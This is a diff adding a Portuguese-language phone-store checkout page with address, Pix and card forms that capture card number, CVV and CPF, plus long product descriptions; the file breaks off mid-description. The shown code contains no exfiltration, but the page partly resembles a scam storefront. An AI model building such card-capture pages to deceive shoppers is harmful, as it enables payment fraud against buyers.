@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Finalizar Compra - TechStore</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap');
+    :root { --cor-principal: #2ecc71; --cor-sucesso: #27ae60; --texto-escuro: #000; }
+    * { box-sizing: border-box; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; outline: none; }
+    body { background: #f0f0f0; color: var(--texto-escuro); padding-bottom: 80px; }
+
+    .header-shopee { background: #fff; padding: 15px; display: flex; align-items: center; gap: 20px; border-bottom: 2px solid #ccc; position: sticky; top: 0; z-index: 1000; }
+    .header-shopee i { font-size: 20px; color: var(--cor-principal); cursor: pointer; padding: 5px; }
+    .header-shopee h1 { font-size: 18px; font-weight: 700; }
+
+    .section { background: #fff; margin-top: 10px; padding: 15px; border-bottom: 1px solid #bbb; }
+    
+    .item-flex { display: flex; gap: 12px; }
+    .item-img { width: 95px; height: 95px; object-fit: contain; border: 1.5px solid #aaa; border-radius: 4px; }
+    .item-info h3 { font-size: 15px; font-weight: 700; color: #000; line-height: 1.2; }
+    .item-price { margin-top: 5px; color: #000; font-size: 17px; font-weight: 800; display: block; }
+
+    /* Cores */
+    .cor-container { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
+    .cor-opt { padding: 8px 15px; border: 1.5px solid #ccc; border-radius: 20px; font-size: 12px; font-weight: 700; cursor: pointer; }
+    .cor-opt.active { border-color: var(--cor-principal); background: #e0f7ff; color: var(--cor-principal); }
+
+    /* Descrição com Ver Mais */
+    .titulo-desc { font-weight: 900; font-size: 13px; margin-top: 15px; text-transform: uppercase; color: #333; }
+    .desc-wrapper { margin-top: 5px; }
+    .desc-texto { font-size: 13px; color: #555; line-height: 1.5; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; white-space: pre-line; }
+    .desc-texto.aberta { -webkit-line-clamp: unset; display: block; }
+    .ver-mais-btn { color: var(--cor-principal); font-size: 13px; font-weight: 800; cursor: pointer; margin-top: 5px; display: inline-block; }
+
+    /* Forms */
+    .form-group { margin-bottom: 14px; }
+    .form-group label { display: block; font-size: 12px; color: #333; margin-bottom: 5px; text-transform: uppercase; font-weight: 800; }
+    .form-group input { width: 100%; padding: 12px; border: 1.5px solid #bbb; border-radius: 6px; font-size: 15px; font-weight: 500; }
+    .form-row { display: flex; gap: 10px; }
+
+    /* Pagamento */
+    .pay-methods-row { display: flex; gap: 10px; margin-top: 10px; }
+    .pay-option { flex: 1; display: flex; align-items: center; justify-content: center; padding: 14px; border: 2px solid #ccc; border-radius: 8px; cursor: pointer; background: #fff; font-weight: 800; }
+    .pay-option.active { border-color: var(--cor-sucesso); background: #e8f6f4; }
+
+    pix-form { display: block; margin-top: 15px; padding: 20px; border: 2px dashed var(--cor-sucesso); text-align: center; background: #fff; }
+#qrcode { display: flex; justify-content: center; margin: 15px auto 10px auto; }
+    .pix-copy-box { background: #eee; padding: 10px; border-radius: 4px; font-size: 11px; margin: 10px 0; word-break: break-all; border: 1px solid #ccc; }
+
+    #card-form { display: none; margin-top: 15px; padding: 15px; border: 2px solid var(--cor-principal); border-radius: 8px; background: #fff; }
+    .bandeiras { display: flex; gap: 10px; margin-bottom: 15px; opacity: 0.5; }
+    .bandeiras img { width: 35px; }
+
+    .summary-row { display: flex; justify-content: space-between; font-size: 15px; margin-bottom: 8px; font-weight: 600; }
+    .total-preto { color: #000 !important; font-weight: 900; font-size: 18px; border-top: 1px solid #ddd; padding-top: 10px; margin-top: 10px; }
+
+    .footer-checkout { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; align-items: center; border-top: 2px solid #ccc; height: 65px; z-index: 1000; }
+    .total-container { flex: 1; text-align: right; padding-right: 15px; font-weight: 900; font-size: 20px; color: #000; }
+    .btn-fazer-pedido { background: var(--cor-principal); color: #fff; border: none; height: 100%; padding: 0 25px; font-size: 15px; font-weight: 900; cursor: pointer; }
+    
+    .mini-foto { 
+    width: 60px; 
+    height: 60px; 
+    object-fit: contain; 
+    border: 2px solid #ddd; 
+    border-radius: 6px; 
+    cursor: pointer; 
+    background: #fff; 
+    flex-shrink: 0; 
+}
+.mini-foto.ativa { 
+    border-color: #2ecc71; /* Cor verde TechStore */
+    box-shadow: 0 0 5px rgba(0, 191, 255, 0.3); 
+}
+
+.cor-opt.esgotado {
+    background-color: #f2f2f2;
+    color: #999;
+    border-color: #ddd;
+    cursor: not-allowed;
+    opacity: 0.7;
+    position: relative;
+}
+
+.bandeiras img {
+    width: 45px; 
+    height: 28px;
+    object-fit: contain;
+    filter: grayscale(100%); /* Apenas preto e branco */
+    opacity: 0.15; /* Bem clarinho para não distrair */
+    transition: all 0.3s ease; /* Transição rápida e limpa */
+}
+
+/* Quando detectada: FICA A COR NATURAL DA FOTO */
+.bandeiras img.detectada {
+    filter: none !important; /* REMOVE todos os filtros (inclusive o cinza) */
+    opacity: 1 !important;   /* Fica 100% visível */
+    transform: scale(1.2);   /* Aumenta só um pouco para destacar */
+}
+
+</style>
+</head>
+<body>
+
+<div class="header-shopee">
+    <i class="fas fa-arrow-left" onclick="window.location.href='index.html'"></i>
+    <h1>Finalizar Compra</h1>
+</div>
+
+<div class="section">
+    <div class="item-flex">
+        <img src="" id="js-img" class="item-img">
+        <div class="item-info">
+            <h3 id="js-nome">...</h3>
+            <span class="item-price" id="js-preco-topo">R$ 0,00</span>
+        </div>
+    </div>
+
+    <p style="font-weight: 800; font-size: 13px; color: #333; margin-top: 15px; text-transform: uppercase;">Cor:</p>
+<div class="cor-container">
+    <div class="cor-opt active" onclick="selCor(this)">Branco</div>
+    <div class="cor-opt" onclick="selCor(this)">Preto</div>
+    <div class="cor-opt" onclick="selCor(this)">Cinza</div>
+    <div class="cor-opt" onclick="selCor(this)">Azul</div>
+</div>
+
+<p style="font-weight: 800; font-size: 11px; margin-top: 20px; color: #666; text-transform: uppercase;">Produtos no seu carrinho:</p>
+<div id="js-galeria" style="display: flex; gap: 10px; margin-top: 10px; overflow-x: auto; padding-bottom: 10px;">
+    </div>
+
+    <p class="titulo-desc">Descrição do produto</p>
+    <div class="desc-wrapper">
+        <div class="desc-texto" id="js-desc">...</div>
+        <span class="ver-mais-btn" id="js-btn-ver" onclick="toggleDesc()">Ver mais</span>
+    </div>
+</div>
+
+<div class="section">
+    <p style="font-weight: 900; font-size: 14px; margin-bottom: 10px;">OPÇÃO DE ENVIO</p>
+    <div class="shipping-box" style="border: 2px solid #1b8a7b; background: #f1f8f7; padding: 12px; border-radius: 4px;">
+        <div style="display: flex; justify-content: space-between; font-size: 14px; color: #126e63; font-weight: 800;">
+            <span><i class="fas fa-truck"></i> Entrega Expressa TechStore</span> 
+            <span style="font-weight: 900;">FRETE GRÁTIS</span>
+        </div>
+        <div style="color: #d32f2f; font-weight: 900; font-size: 13px; margin-top: 8px; display: flex; align-items: center; gap: 5px;">
+            <i class="fas fa-bolt"></i> ENVIO IMEDIATO
+        </div>
+        <p style="font-size: 11px; color: #666; margin-top: 5px;">Chegará em sua residência de 15 a 25 dias úteis.</p>
+    </div>
+</div>
+
+<div class="section">
+    <p style="font-weight: 900; margin-bottom: 15px;">ENDEREÇO DE ENTREGA</p>
+    <div class="form-group"><label>Nome Completo</label><input type="text" id="f-nome" placeholder="Nome do recebedor" required>
+</div>
+    <div class="form-row">
+        <div class="form-group" style="flex:1"><label>CEP</label><input type="tel" id="f-cep" oninput="mCEP(this)" maxlength="9" required></div>
+        <div class="form-group" style="flex:1"><label>WhatsApp (Opcional)</label><input type="tel" id="f-tel" oninput="mTel(this)" maxlength="15"></div>
+    </div>
+    <div class="form-group"><label>Rua, Número e Bairro</label><input type="text" id="f-rua" required></div>
+    <div class="form-row">
+        <div class="form-group" style="flex:2"><label>Cidade</label><input type="text" id="f-cid" required></div>
+        <div class="form-group" style="flex:1"><label>Estado</label><input type="text" id="f-est" required></div>
+    </div>
+</div>
+
+<div class="section">
+    <p style="font-weight: 900; margin-bottom: 12px;">PAGAMENTO</p>
+    <div class="pay-methods-row">
+        <div class="pay-option active" onclick="setMetodo('pix')" id="opt-pix">Pix</div>
+        <div class="pay-option" onclick="setMetodo('card')" id="opt-card">Cartão</div>
+    </div>
+
+    <div id="pix-form">
+        <div id="qrcode"></div>
+        <p style="font-size: 12px; font-weight: 700; margin-top: 10px;">Chave Pix:</p>
+        <div class="pix-copy-box" id="js-pix-pld">...</div>
+        <button onclick="copiarPix()" style="width:100%; padding:12px; background:var(--cor-sucesso); color:#fff; border:none; border-radius:5px; font-weight:900;">COPIAR PIX</button>
+    </div>
+
+    <div id="card-form">
+        <div class="bandeiras">
+    <img src="bandeiras/visa.png" id="band-visa">
+    <img src="bandeiras/mastercard.png" id="band-mastercard">
+    <img src="bandeiras/elo.png" id="band-elo">
+    <img src="bandeiras/hipercard.png" id="band-hipercard">
+    <img src="bandeiras/amex.png" id="band-amex">
+</div>
+        <div class="form-group"><label>Número do Cartão</label><input type="tel" oninput="mCard(this)" maxlength="19" placeholder="0000 0000 0000 0000" required>
+</div>
+        <div class="form-group"><label>Nome no Cartão</label><input type="text" oninput="this.value = this.value.toUpperCase()" required></div>
+        <div class="form-row">
+    <div class="form-group" style="flex:1">
+        <label>Validade</label>
+        <input type="tel" oninput="mVal(this)" maxlength="5" placeholder="MM/AA" required>
+    </div>
+    <div class="form-group" style="flex:1">
+        <label>CVV</label>
+        <input type="tel" oninput="this.value = this.value.replace(/\D/g,'')" maxlength="3" placeholder="000" required>
+    </div>
+</div>
+
+<div class="form-group">
+    <label>CPF do Titular</label>
+    <input type="tel" oninput="mCPF(this)" maxlength="14" placeholder="000.000.000-00" required>
+</div>
+        <div class="form-group">
+    <label>Parcelamento</label>
+    <select id="f-parcelas" style="width: 100%; padding: 12px; border: 1.5px solid #bbb; border-radius: 6px; font-size: 15px; font-weight: 500; background: #fff;">
+    </select>
+</div>
+    </div>
+</div>
+
+<div class="section">
+    <div class="summary-row"><span>Subtotal</span> <span id="js-sub">R$ 0,00</span></div>
+    <div class="summary-row"><span>Frete</span> <span style="color:var(--cor-sucesso)">GRÁTIS</span></div>
+    <div class="summary-row" style="color: #666; font-size: 13px;"><span>Cor Escolhida</span> <span id="js-cor-resumo">Branco</span></div>
+    
+    <div class="summary-row total-preto"><span>Total</span> <span id="js-total-fim">R$ 0,00</span></div>
+</div>
+
+<div class="footer-checkout">
+    <div class="total-container" id="js-total-rod">R$ 0,00</div>
+    <button class="btn-fazer-pedido" onclick="validarCartaoAutomatico()">Fazer Pedido</button>
+</div>
+
+<script>
+// Máscaras
+function mCEP(i){ i.value = i.value.replace(/\D/g,"").replace(/(\d{5})(\d)/,"$1-$2"); }
+function mTel(i){ i.value = i.value.replace(/\D/g,"").replace(/^(\d{2})(\d)/g,"($1) $2").replace(/(\d{5})(\d)/,"$1-$2"); }
+function mVal(i){ i.value = i.value.replace(/\D/g,"").replace(/(\d{2})(\d)/,"$1/$2"); }
+function mCPF(i){ i.value = i.value.replace(/\D/g,"").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2"); }
+function mCard(i) {
+    // 1. Aplica a máscara de números 0000 0000...
+    let v = i.value.replace(/\D/g, "");
+    i.value = v.replace(/(\d{4})(?=\d)/g, "$1 ");
+
+    // 2. Remove o destaque de todas as bandeiras
+    document.querySelectorAll('.bandeiras img').forEach(img => img.classList.remove('detectada'));
+
+    // 3. Lógica de detecção (BIN)
+    if (v.length >= 2) {
+        if (v.startsWith('4')) {
+            document.getElementById('band-visa').classList.add('detectada');
+        } 
+        else if (/^(5[1-5]|2[2-7])/.test(v)) {
+            document.getElementById('band-mastercard').classList.add('detectada');
+        } 
+        else if (/^(4011|4312|4389|4514|4573|4576|5041|5066|5090|6277|6362|6363|6504|6505|6507|6509|6516|6550)/.test(v)) {
+            document.getElementById('band-elo').classList.add('detectada');
+        }
+        else if (/^(34|37)/.test(v)) {
+            document.getElementById('band-amex').classList.add('detectada');
+        }
+        else if (/^(6062|3841)/.test(v)) {
+            document.getElementById('band-hipercard').classList.add('detectada');
+        }
+    }
+}
+
+const baseDescricoes = {
+    // O nome aqui tem de ser igual ao nome do produto na loja (em minúsculo)
+    "iphone 16 pro max": `iPhone 16 Pro Max. Com estrutura em titânio, Controle da Câmera, 4K Dolby Vision a 120 qps e o chip A18 Pro. Avisos legais As telas têm bordas arredondadas. Quando medida como um retângulo, a tela tem 6,12 polegadas (iPhone 16), 6,69 polegadas (iPhone 16 Plus), 6,27 polegadas (iPhone 16 Pro) ou 6,86 polegadas (iPhone 16 Pro Max) na diagonal. A área real de visualização é menor. A duração da bateria varia de acordo com o uso e a configuração. Consulte apple.com/br/batteries para obter mais informações. Acessórios vendidos separadamente. Alguns recursos podem não estar disponíveis em todos os países ou regiões. O iPhone 16 e o iPhone 16 Pro são capazes de identificar um acidente grave de carro e ligar para os serviços de emergência. Requer uma conexão de rede celular ou chamadas Wi-Fi.`,
+    
+    "iphone 15 pro": `A Dynamic Island chega ao iPhone 15 e mostra alertas e Atividades ao Vivo para você não perder nenhuma informação enquanto faz outras coisas. Você pode acompanhar sua próxima corrida, saber quem está ligando, confirmar as informações do seu voo e muito mais. O iPhone 15 tem vidro resistente colorido por infusão e design em alumínio. Ele aguenta o tranco contra respingos, água e poeira. A parte da frente em Ceramic Shield é mais resistente que qualquer vidro de smartphone. E a tela Super Retina XDR de 6,1 pol, é até duas vezes mais visível sob o sol em comparação com o iPhone 14. A câmera grande-angular de 48 MP fotografa em altíssima resolução. Assim, fica ainda mais fácil fazer fotos com detalhes incríveis. A teleobjetiva de 2x com qualidade óptica ajuda no enquadramento do close perfeito. Faça retratos com mais detalhes e intensidade de cores. É só tocar para mudar o foco de uma pessoa para outra, mesmo depois do clique. Poderoso chip A16 Bionic. O chip ultrarrápido possibilita recursos avançados, como a fotografia computacional, as transições fluidas da Dynamic Island e o Isolamento de Voz para ligações. E o A16 Bionic tem eficiência de sobra para que a bateria dure o dia todo. Com a porta USB‑C, você recarrega seu iPhone 15 com o mesmo cabo que usa para recarregar o Mac ou o iPad. Você pode até utilizar o iPhone 15 para recarregar o Apple Watch ou os AirPods. Com a Detecção de Acidente, o iPhone é capaz de identificar se você sofreu um acidente grave de carro e ligar para a emergência se você não puder. O iPhone protege sua privacidade e dá a você o controle dos seus dados. Ele é feito com mais materiais reciclados para minimizar o impacto ambiental. E vem com recursos integrados para tornar o iPhone acessível a todas as pessoas. Avisos legais: O iPhone 15, o iPhone 15 Plus, o iPhone 15 Pro e o iPhone 15 Pro Max são resistentes a respingos, água e poeira e foram testados em condições controladas em laboratório, classificados como IP68 segundo a norma IEC 60529, profundidade máxima de 6 metros por até 30 minutos. A resistência a respingos, água e poeira não é uma condição permanente e pode diminuir com o tempo. Não tente recarregar um iPhone molhado. Veja instruções de limpeza e secagem no Manual do Usuário. Danos decorrentes de contato com líquidos não estão incluídos na garantia. A tela tem bordas arredondadas. Quando medida como um retângulo, a tela tem 6,12 polegadas. (iPhone 15 Pro, iPhone 15) ou 6,69 polegadas (iPhone 15 Pro Max, iPhone 15 Plus) na diagonal. A área real de visualização é menor. A duração da bateria varia de acordo com o uso e a configuração.
+Resolução da Câmera Traseira
+Grande-angular de 48MP, Ultra-angular de 12MP, Teleobjetiva de 2x de 12MP
+Resolução da Câmera Frontal
+12MP
+Capacidade da Bateria
+Bateria interna recarregável de íon de lítio
+Carregamento Rápido
+Recarga sem fio MagSafe até 15W, Recarga sem fio padrão Qi até 7,5W
+Material
+Alumínio
+Certificado Homologado pela Anatel Número
+12757-23-01993
+Certificações
+Classificados como IP68 (profundidade máxima de seis metros por até 30 minutos) segundo a norma IEC 60529
+Peso do Produto
+0,171Kg
+Peso do Produto com Embalagem
+0,335Kg
+Dimensões do Produto
+Largura: 7,16cm - Altura: 0,78cm - Profundidade: 14,76cm
+Dimensões do Produto com Embalagem
+Largura: 9cm - Altura: 3cm - Profundidade: 16,6cm
+Prazo de Garantia
+01 ano (3 meses de garantia legal e mais 9 meses de garantia especial concedida pelo fabricante).
+Conteúdo da Embalagem
+1 iPhone com iOS 17, Cabo para recarga com conector USB-C e Documentação
+O que os clientes estão falando do produto
+bateria durável
+sistema rápido
+design bonito
+processador potente
+De acordo com os comentários, o aparelho se destaca pelo design, sistema rápido e construção robusta, sendo considerado um produto premium que oferece alta qualidade e excelente desempenho. Usuários relatam satisfação com a performance, recursos e facilidade de uso, apesar de algumas observações sobre a duração da bateria em alguns casos`,
+
+    "iphone 14 pro": `• Dynamic Island: Uma nova forma de interação
+• Tela Super Retina XDR de 6.1 polegadas
+• Tecnologia Always-On (Tela Sempre Ativa)
+• Chip A16 Bionic (Potência extrema)
+• Câmera Principal de 48MP com detalhes surreais
+• Modo Cinema agora em 4K Dolby Vision
+• Modo Ação para vídeos com estabilidade total
+• Detecção de Acidente (Segurança avançada)
+• Bateria para o dia todo (Até 23h de vídeo)
+• Ceramic Shield: Frente mais resistente
+• Resistência à água e poeira (IP68)
+• Design em Aço Inoxidável Cirúrgico
+• Fotonic Engine para cores mais vivas
+• Flash Adaptive True Tone renovado
+• Produto Original e Homologado Anatel
+• Garantia de satisfação TechStore.`,
+  
+     "iphone 13 pro max": `O iPhone 13 Pro Max é o ápice da tecnologia Apple para quem busca tela grande e bateria de longa duração.
+• Tela Super Retina XDR de 6.7 polegadas com ProMotion (120Hz).
+• Sistema de Câmera Pro: Grande-angular, Ultra-angular e Teleobjetiva de 12MP.
+• Modo Cinema: Diminui a profundidade de campo e muda o foco automaticamente nos seus vídeos.
+• Estilos Fotográficos e Vídeo ProRes.
+• Scanner LiDAR para retratos no modo Noite e experiências em RA.
+• Chip A15 Bionic para um desempenho impressionante.
+• Bateria com a maior autonomia já vista em um iPhone até então.
+• Ceramic Shield: Mais resistente do que qualquer vidro de smartphone.
+• Classificação IP68 de resistência à água.`,
+
+      "iphone 13": `O iPhone 13 oferece o equilíbrio perfeito entre potência e eficiência, ideal para o dia a dia.
+• Tela Super Retina XDR de 6.1 polegadas.
+• Sistema de Câmera Dupla Avançada: Grande-angular e Ultra-angular de 12MP.
+• Estilos Fotográficos: Personalize o aspeto das suas fotos.
+• Modo Cinema: Gravações com profundidade de campo rasa e transições de foco automáticas.
+• Chip A15 Bionic: Desempenho ultra-rápido e maior eficiência energética.
+• Bateria com grande autonomia para o dia todo.
+• Ceramic Shield: O vidro mais resistente de qualquer smartphone.
+• Resistência à água IP68.
+• Compatível com 5G para downloads super-rápidos e streaming de alta qualidade.
+• Suporte completo a acessórios MagSafe.`,
+
+         "iphone 12": `O iPhone 12 traz o design elegante com bordas planas e a tecnologia 5G para uma experiência ultra-rápida.
+• Tela Super Retina XDR de 6.1 polegadas.
+• Sistema de Câmera Dupla (12MP): Modo Noite em todas as câmeras.
+• Gravação de vídeo em HDR com Dolby Vision.
+• Chip A14 Bionic: O primeiro chip de 5 nanómetros da indústria.
+• Ceramic Shield: Quatro vezes mais resistente a quedas.
+• Resistência à água IP68.
+• Compatível com acessórios MagSafe.`,
+
+    "iphone 7s": `O iPhone 7 Plus é um clássico conhecido pela sua durabilidade e pela introdução da câmera dupla.
+• Tela Retina HD de 5.5 polegadas.
+• Sistema de Câmera Dupla de 12MP com Zoom Ótico.
+• Modo Retrato para fotos com fundo desfocado.
+• Botão Home de estado sólido com Touch ID.
+• Resistência à água e poeira (IP67).
+• Chip A10 Fusion para um desempenho eficiente.
+• Design em alumínio resistente.`,
+
+        "iphone 11": `O iPhone 11 chegou para oferecer tudo o que você precisa em um smartphone com um design colorido e resistente.
+• Tela Liquid Retina HD de 6.1 polegadas: Cores fiéis e brilho incrível.
+• Sistema de Câmera Dupla (12MP): Ultra-angular e Grande-angular com Modo Noite automático para fotos perfeitas no escuro.
+• Vídeos em 4K: Grave vídeos com qualidade de cinema a 60 qps em todas as câmeras.
+• Chip A13 Bionic: Desempenho ultra-fluido para jogos pesados e tarefas do dia a dia.
+• Bateria para o dia todo: Eficiência energética que acompanha seu ritmo.
+• Face ID: A autenticação facial mais segura em um smartphone.
+• Resistência à água: Classificação IP68 (até 2 metros por 30 minutos).
+• Design em vidro e alumínio aeroespacial durável.`,
+
+    "iphone xr": `O iPhone XR combina a tecnologia avançada da Apple com uma tela ampla e cores vibrantes, sendo um dos favoritos pela sua eficiência.
+• Tela Liquid Retina de 6.1 polegadas: A tela LCD mais avançada da indústria.
+• Câmera Grande-angular de 12MP: Modo Retrato com controle de profundidade e iluminação de retrato.
+• HDR Inteligente: Maior nível de detalhes nas luzes e nas sombras das suas fotos.
+• Chip A12 Bionic com Neural Engine: Inteligência artificial para fotos e realidade aumentada.
+• Face ID Avançado: Desbloqueie o aparelho e acesse apps apenas com o olhar.
+• Bateria de longa duração: Otimizado para durar o dia inteiro longe da tomada.
+• Resistência à água e poeira: Classificação IP67.
+• Acabamento em vidro resistente e moldura em alumínio série 7000.`,
+
+       "iphone se 2022": `O iPhone SE (2022) une o design clássico e compacto que você adora com o poder de processamento dos modelos mais novos.
+• Tela Retina HD de 4.7 polegadas: Compacta, brilhante e perfeita para usar com uma mão.
+• Chip A15 Bionic: O mesmo processador do iPhone 13, garantindo velocidade incrível e apps que abrem instantaneamente.
+• Sistema de Câmera Avançada (12MP): HDR Inteligente 4, Estilos Fotográficos e o aclamado Modo Retrato.
+• Gravação de Vídeo 4K: Detalhes impressionantes até em condições de pouca luz.
+• Botão Home com Touch ID: Desbloqueio seguro e rápido com a sua impressão digital.
+• Conectividade 5G: Downloads e streaming em alta velocidade onde quer que você esteja.
+• Design Resistente: Vidro durável na frente e atrás e classificação IP67 de resistência à água.
+• Bateria Otimizada: Grande autonomia e compatibilidade com carregamento sem fio.`,
+
+         "galaxy s24 ultra": `O Samsung Galaxy S24 Ultra redefine os limites da inovação com a nova era da Inteligência Artificial e um design ultra-resistente em Titânio.
+• Galaxy AI: Revolucione sua produtividade com tradução simultânea de chamadas, assistente de escrita e o incrível "Circule para Pesquisar" do Google.
+• Design em Titânio: Novo acabamento premium que oferece muito mais resistência contra impactos e um visual sofisticado.
+• Tela Plana Dynamic AMOLED 2X de 6.8 polegadas: A tela mais brilhante da Samsung com 2.600 nits, perfeita para ver sob o sol forte, e taxa de atualização de 120Hz.
+• Sensor de 200MP e Zoom Espacial: Capture fotos com detalhes absurdos e vídeos em 8K. O novo zoom óptico de 50MP garante nitidez mesmo de longe.
+• Processador Snapdragon 8 Gen 3 for Galaxy: Performance máxima para os jogos mais pesados e multitarefa sem engasgos.
+• S Pen Integrada: Mantenha o legado da linha Note, desenhando, anotando e controlando sua câmera à distância.
+• Bateria Inteligente de 5.000 mAh: Dura o dia todo com gerenciamento otimizado por IA.`,
+
+    "galaxy s23 ultra": `O Galaxy S23 Ultra é o smartphone definitivo para fotografia profissional e performance extrema, sendo uma referência no mundo Android.
+• Sensor Principal de 200MP: O sistema Nightography permite fotos e vídeos épicos, com clareza e cores vibrantes, mesmo em ambientes quase sem luz.
+• Zoom Espacial de até 100x: Capture a lua ou detalhes distantes com a estabilização óptica mais avançada da categoria.
+• Tela Dynamic AMOLED 2X: Cores cinematográficas em uma tela de 6.8 polegadas que se ajusta ao ambiente para proteger sua visão.
+• Snapdragon 8 Gen 2 for Galaxy: Um chip exclusivo que oferece a experiência de jogo mais rápida do mundo em um smartphone Android.
+• S Pen Integrada: Mais produtividade para assinar documentos, editar fotos com precisão e controlar apresentações.
+• Design Sustentável: Construído com vidro reciclado e corantes naturais, unindo luxo e respeito ao meio ambiente.
+• Proteção Gorilla Glass Victus 2: A maior resistência contra arranhões e quedas em ambos os lados do aparelho.`,
+
+         "galaxy s22 ultra": `O Galaxy S22 Ultra foi o primeiro a integrar a S Pen ao design da linha S, unindo o poder da fotografia com a máxima produtividade.
+• S Pen Integrada: Escreva, desenhe e edite fotos com uma latência ultra-baixa, transformando o seu celular em um caderno digital.
+• Sensor de 108MP: Capture imagens com clareza profissional e detalhes impressionantes, mesmo com zoom ampliado.
+• Nightography: O processador e os sensores avançados permitem fotos nítidas e vídeos brilhantes em ambientes com pouca luz.
+• Tela Dynamic AMOLED 2X de 6.8 polegadas: Cores vibrantes e brilho intenso para a melhor experiência de visualização.
+• Processador Snapdragon 8 Gen 1: Desempenho de alta performance para games e multitarefa pesada.
+• Super Zoom de 100x: Aproxime-se de qualquer cena com estabilidade e tecnologia de IA.
+• Design Icônico: Acabamento premium em vidro e moldura de alumínio polido, combinando luxo e resistência.`,
+
+    "galaxy z fold 5": `O Galaxy Z Fold 5 é a definição de inovação, oferecendo uma tela de tablet que cabe no seu bolso para uma produtividade sem limites.
+• Tela Principal de 7.6 polegadas: Uma tela dobrável imersiva com tecnologia AMOLED e 120Hz para trabalhar ou jogar em alta escala.
+• Dobradiça Flex: Novo design de dobradiça que permite ao aparelho fechar totalmente plano, tornando-o mais fino e elegante.
+• Multitarefa Avançada: Abra até três aplicativos simultaneamente e alterne entre eles com a barra de tarefas inteligente.
+• Compatível com S Pen Fold Edition: Faça anotações e desenhos com precisão na tela gigante dobrável.
+• Processador Snapdragon 8 Gen 2 for Galaxy: Velocidade extrema para processar dados e gráficos de última geração.
+• Sistema de Câmera Pro: Sensor principal de 50MP com IA que otimiza cada detalhe da sua foto automaticamente.
+• Durabilidade Reforçada: Proteção IPX8 contra água e Gorilla Glass Victus 2 para maior resistência contra quedas e arranhões.`,
+
+       "galaxy z flip 5": `O Galaxy Z Flip 5 é o smartphone dobrável que une estilo icónico e portabilidade extrema com a sua nova e maior Tela Flex.
+• Tela Flex de 3.4 polegadas: Use widgets, responda a mensagens, tire fotos e veja notificações sem precisar de abrir o telemóvel.
+• Design Compacto e Dobrável: Fecha totalmente plano graças à nova dobradiça Flex, cabendo perfeitamente nos bolsos mais pequenos.
+• Câmera FlexCam: Tire as melhores selfies com a câmara principal usando a tela externa como visor, ou dobre o telemóvel para tirar fotos em grupo sem tripé.
+• Processador Snapdragon 8 Gen 2 for Galaxy: Performance de topo de gama para uma navegação fluida e jogos de alta qualidade.
+• Resistência à Água IPX8: O único dobrável resistente à água, construído com materiais duráveis como o Armor Aluminum.
+• Tela Principal de 6.7 polegadas Dynamic AMOLED 2X: Cores vibrantes e uma taxa de atualização de 120Hz para uma visualização suave.
+• Inteligência Artificial: Otimização de bateria e processamento de imagem para fotos perfeitas em qualquer iluminação.`,
+
+    "galaxy s24 plus": `O Galaxy S24 Plus oferece o equilíbrio ideal entre uma tela grande, bateria de longa duração e o poder revolucionário do Galaxy AI.
+• Galaxy AI: Utilize ferramentas inteligentes como o "Circule para Pesquisar", tradução de chamadas em tempo real e o assistente de escrita para mensagens.
+• Tela QHD+ de 6.7 polegadas: Resolução incrível e nitidez superior com a tecnologia Dynamic AMOLED 2X e brilho de pico de 2.600 nits.
+• Sistema de Câmera Tripla com IA: Sensor principal de 50MP que utiliza inteligência artificial para melhorar texturas e reduzir ruídos nas fotos.
+• Bateria de 4.900 mAh: Uma das maiores autonomias da linha Galaxy, suportando carregamento ultra-rápido para você nunca ficar parado.
+• Desempenho de Próxima Geração: Novo processador otimizado para lidar com inteligência artificial e multitarefa pesada sem aquecer.
+• Design Elegante e Sustentável: Bordas finas, acabamento acetinado e construído com materiais reciclados de alta qualidade.
+• Proteção Avançada: Vidro resistente contra quedas e classificação IP68 contra água e poeira para total tranquilidade.`,
+
+            "galaxy a55": `O Galaxy A55 eleva o padrão da linha A com um design premium em metal e vidro, oferecendo performance de nível superior e segurança avançada.
+• Design em Metal e Vidro: Acabamento sofisticado com moldura lateral em metal e proteção Gorilla Glass Victus+ para máxima durabilidade.
+• Tela Super AMOLED de 6.6 polegadas: Resolução FHD+ com 120Hz e tecnologia Vision Booster para cores intensas mesmo sob luz solar forte.
+• Processador Octa-core Potente: Desempenho otimizado para jogos pesados e multitarefa fluida com suporte à rede 5G ultra-rápida.
+• Câmera Principal de 50MP com OIS: Fotos nítidas e vídeos estáveis em 4K, com sensores grandes que captam mais luz para um Nightography épico.
+• Samsung Knox Vault: Segurança de nível governamental para proteger suas senhas e dados privados contra ataques de hardware.
+• Bateria de 5.000 mAh: Longa duração para até dois dias de uso e suporte a carregamento rápido de 25W.
+• Resistência IP67: Protegido contra água e poeira, garantindo tranquilidade em qualquer situação do seu dia.`,
+
+    "galaxy a35": `O Galaxy A35 combina um design sofisticado em vidro com recursos premium de fotografia e segurança para o seu dia a dia.
+• Design Elegante em Vidro: Acabamento premium com layout de câmera icônico e moldura lateral plana para melhor pegada.
+• Tela Infinita Super AMOLED de 6.6 polegadas: Resolução FHD+ com Vision Booster, garantindo visibilidade perfeita em qualquer ambiente.
+• Sistema de Câmera Tripla de 50MP: Fotos de alta resolução com detalhes incríveis e Nightography aprimorado para fotos noturnas.
+• Gravação de Vídeo 4K: Capture momentos com qualidade profissional e cores ricas em qualquer iluminação.
+• Resistência à Água e Poeira (IP67): Durabilidade garantida para enfrentar imprevistos como chuva ou derramamentos de líquidos.
+• Processador de Alto Desempenho: Otimizado para jogos e multitarefa, mantendo o smartphone rápido e frio.
+• Samsung Knox Vault: Proteção avançada para suas senhas e informações sensíveis contra invasões.`,
+
+       "galaxy a25": `O Galaxy A25 é a escolha ideal para quem procura uma experiência visual incrível e alto desempenho num smartphone equilibrado.
